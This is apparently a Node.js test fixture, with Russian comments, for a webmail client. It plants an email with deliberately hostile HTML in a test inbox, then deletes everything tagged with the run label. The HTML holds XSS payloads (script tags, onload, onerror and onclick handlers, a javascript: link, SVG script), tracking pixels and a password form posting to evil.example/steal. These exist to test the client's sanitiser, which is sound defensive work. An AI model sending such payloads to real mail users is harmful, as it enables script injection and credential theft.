// Письма для проверки интерфейса почты на тестовом ящике: «враждебное» письмо с вёрсткой кладётся
// прямо во входящие (как будто пришло снаружи), а после проверки всё с меткой прогона удаляется.
//   node <сборка> <сервер аккаунтов> <почтовый сервер> <имя> <файл с паролем> put|clean <метка>
import { readFileSync } from "node:fs";
import "./setup.mjs";
import { Account } from "../../../web/src/core/account.js";
import { Api } from "../../../web/src/core/api.js";
import { utf8 } from "../../../web/src/core/bytes.js";
import { Jmap } from "../../../web/src/core/jmap.js";
import { Mail } from "../../../web/src/core/mail.js";
import { MailPgp } from "../../../web/src/core/mailpgp.js";
import { MemoryStore } from "../../../web/src/core/store.js";

const [api, jmapUrl, name, passwordFile, mode, tag] = process.argv.slice(2);
const account = new Account({ api: new Api(api), store: new MemoryStore() });
await account.signIn(name, readFileSync(passwordFile, "utf8").trim());
const mail = new Mail({ account, jmap: new Jmap(account, { proxy: api, direct: jmapUrl }), pgp: new MailPgp(account) });
const out = {};
try {
  await mail.folders();
  if (mode === "put") {
    const png = "iVBORw0KGgoAAAANSUhEUgAAAAgAAAAICAYAAADED76LAAAAFUlEQVQYlWNk+M/wn4EIwDiqkL4KAcT9CAHxqZ3HAAAAAElFTkSuQmCC";
    const html = `<html><head><style>body{background:#fff7f0} .x{background:url(https://evil.example/bg.png)} @import url(https://evil.example/a.css);</style><script>window.parent.__pwned=1</script></head>
<body onload="parent.__pwned=2">
<h1 id="t">Заголовок письма ${tag}</h1>
<p style="color:#b00020" onclick="parent.__pwned=3" id="styled">Абзац со <b>стилем</b></p>
<img id="pixel" src="https://evil.example/pixel.gif" width="1" height="1">
<img id="logo" src="cid:logo123" alt="logo" width="32" height="32">
<img id="bad" src=x onerror="parent.__pwned=4">
<a href="javascript:parent.__pwned=5" id="js">плохая ссылка</a>
<a href="https://example.com/ok" id="ok">хорошая ссылка</a>
<form action="https://evil.example/steal"><input name="pw"><button>go</button></form>
<iframe src="https://evil.example/"></iframe>
<svg onload="parent.__pwned=6"><script>parent.__pwned=7</script></svg>
<table width="900" id="wide"><tr><td>широкая таблица для проверки вписывания по ширине экрана телефона</td></tr></table>
</body></html>`;
    const b64 = s => Buffer.from(s, "utf8").toString("base64").replace(/(.{76})/g, "$1\r\n");
    const raw = [
      `From: =?UTF-8?B?${Buffer.from("Рассылка магазина").toString("base64")}?= <shop@example.org>`,
      `To: ${account.email}`,
      `Subject: =?UTF-8?B?${Buffer.from(`Вёрстка ${tag}`).toString("base64")}?=`,
      `Date: ${new Date().toUTCString()}`,
      `Message-ID: <fixture-${tag}@example.org>`,
      "MIME-Version: 1.0",
      'Content-Type: multipart/related; boundary="rel-1"',
      "",
      "--rel-1",
      'Content-Type: multipart/alternative; boundary="alt-1"',
      "",
      "--alt-1",
      'Content-Type: text/plain; charset="UTF-8"',
      "Content-Transfer-Encoding: base64",
      "",
      b64(`Заголовок письма ${tag}\nАбзац со стилем\nВаш код подтверждения: 482 913`),
      "--alt-1",
      'Content-Type: text/html; charset="UTF-8"',
      "Content-Transfer-Encoding: base64",
      "",
      b64(html),
      "--alt-1--",
      "--rel-1",
      'Content-Type: image/png; name="logo.png"',
      "Content-Transfer-Encoding: base64",
      "Content-ID: <logo123>",
      'Content-Disposition: inline; filename="logo.png"',
      "",
      png,
      "--rel-1--",
      "",
    ].join("\r\n");
    const { blobId } = await mail.jmap.upload(utf8(raw), "message/rfc822");
    const [r] = await mail.jmap.call([["Email/import", { emails: { m: { blobId, mailboxIds: { [mail.box("inbox").id]: true }, keywords: {} } } }]]);
    out.id = r.created?.m?.id || null;
    out.error = r.notCreated?.m || null;
  } else if (mode === "clean") {
    const ids = new Set();
    for (const text of [tag]) {
      const [q] = await mail.jmap.call([["Email/query", { filter: { text }, limit: 200 }]]);
      q.ids.forEach(id => ids.add(id));
    }
    // письма без метки в тексте (зашифрованные): по теме
    const [q2] = await mail.jmap.call([["Email/query", { filter: { subject: tag }, limit: 200 }]]);
    q2.ids.forEach(id => ids.add(id));
    if (ids.size) {
      await mail.remove([...ids], { forever: true });
    }
    out.removed = ids.size;
    const aliases = await account.api.aliases(account.token);
    for (const a of aliases.filter(x => (x.site || "").includes(tag))) {
      await account.api.aliasDelete(account.token, a.id);
      out.aliases = (out.aliases || 0) + 1;
    }
  }
} finally {
  await account.signOut();
}
console.log(JSON.stringify(out));
